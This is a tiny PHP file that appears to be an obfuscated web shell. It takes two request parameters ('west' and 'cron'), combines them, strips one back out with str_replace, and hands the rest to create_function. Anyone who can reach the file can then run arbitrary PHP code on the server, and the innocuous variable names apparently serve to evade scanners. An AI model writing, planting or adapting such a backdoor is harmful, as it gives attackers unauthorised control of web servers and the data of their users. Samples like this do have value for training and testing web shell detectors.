<?php

$west=@$_REQUEST['west'];

$cron=@$_REQUEST['cron'];

$most=$west.$cron;

$desk=str_replace($west,'',$most);

$fun=create_function('',$desk);

?>  